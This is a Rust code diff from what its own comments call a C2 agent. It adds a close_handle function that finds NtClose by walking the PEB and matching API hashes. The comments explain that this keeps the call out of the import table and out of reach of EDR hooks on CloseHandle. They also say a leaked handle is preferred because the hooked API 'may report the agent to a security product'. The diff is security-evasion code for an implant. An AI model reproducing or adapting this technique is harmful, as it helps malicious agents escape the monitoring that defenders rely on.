@@ -231,3 +231,72 @@ pub unsafe fn get_module_handle_by_hash(_target_hash: u32) -> Option<usize> {
 pub unsafe fn get_proc_address_by_hash(_dll_base: usize, _target_hash: u32) -> Option<usize> {
     None
 }
+
+// ── close_handle: NtClose via PEB walk (M-25 fix) ──────────────────────────
+//
+// Closes a kernel handle using NtClose resolved through the PEB walker so the
+// call does not appear in the module's IAT and is not subject to user-space
+// hooks installed by EDR products on `kernel32!CloseHandle`.
+//
+// If NtClose cannot be resolved (e.g. ntdll missing from PEB on a stripped
+// process), the function silently returns and the handle is leaked.  This is
+// preferable to falling back to the hooked CloseHandle in a C2 agent: a
+// leaked handle is a process-lifetime resource at worst, whereas a hooked
+// API call may report the agent to a security product.
+
+#[cfg(target_arch = "x86_64")]
+pub unsafe fn close_handle(handle: *mut core::ffi::c_void) {
+    use core::sync::atomic::{AtomicUsize, Ordering};
+    static NT_CLOSE_ADDR: AtomicUsize = AtomicUsize::new(0);
+    let addr = NT_CLOSE_ADDR.load(Ordering::Relaxed);
+    let resolved = if addr != 0 {
+        addr
+    } else {
+        let ntdll = get_module_handle_by_hash(HASH_NTDLL_DLL).unwrap_or(0);
+        let a = if ntdll != 0 {
+            get_proc_address_by_hash(ntdll, HASH_NTCLOSE).unwrap_or(0)
+        } else {
+            0
+        };
+        if a != 0 {
+            NT_CLOSE_ADDR.store(a, Ordering::Relaxed);
+        }
+        a
+    };
+    if resolved != 0 {
+        type NtCloseFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
+        let nt_close: NtCloseFn = core::mem::transmute(resolved as *const ());
+        nt_close(handle);
+    }
+}
+
+#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
+pub unsafe fn close_handle(handle: *mut core::ffi::c_void) {
+    use core::sync::atomic::{AtomicUsize, Ordering};
+    static NT_CLOSE_ADDR: AtomicUsize = AtomicUsize::new(0);
+    let addr = NT_CLOSE_ADDR.load(Ordering::Relaxed);
+    let resolved = if addr != 0 {
+        addr
+    } else {
+        let ntdll = get_module_handle_by_hash(HASH_NTDLL_DLL).unwrap_or(0);
+        let a = if ntdll != 0 {
+            get_proc_address_by_hash(ntdll, HASH_NTCLOSE).unwrap_or(0)
+        } else {
+            0
+        };
+        if a != 0 {
+            NT_CLOSE_ADDR.store(a, Ordering::Relaxed);
+        }
+        a
+    };
+    if resolved != 0 {
+        type NtCloseFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
+        let nt_close: NtCloseFn = core::mem::transmute(resolved as *const ());
+        nt_close(handle);
+    }
+}
+
+#[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
+pub unsafe fn close_handle(_handle: *mut core::ffi::c_void) {
+    // No-op on non-Windows targets; CloseHandle is a Windows-only concept.
+}
